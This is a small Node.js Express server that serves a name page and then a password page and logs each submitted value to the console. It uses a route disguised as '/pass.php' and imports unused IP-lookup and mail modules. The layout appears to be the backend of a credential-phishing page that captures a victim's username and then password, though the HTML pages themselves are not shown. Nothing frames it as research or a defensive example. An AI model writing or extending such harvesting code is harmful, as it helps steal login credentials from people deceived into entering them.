const express = require('express');
const exip = require('express-ip');
const path = require('path')
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const app = express();
// const server = require('./server')

app.use(express.urlencoded({
  extended: false
}))

app.use(express.json())
app.use(express.static(path.join(__dirname,"/public")));

app.listen(4040, () => {
  console.log("server running ")
})

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname ,'/name.html'))
  console.log("a new user just login")
})

app.post('/pass.php' , (req, res) => {
  res.sendFile(path.join(__dirname ,'/pass.html'))
  console.log(req.body.name)
})
app.post('/pass' , (req, res) => {
  res.sendFile(path.join(__dirname ,'/name.html'))
  console.log(req.body.name)
})
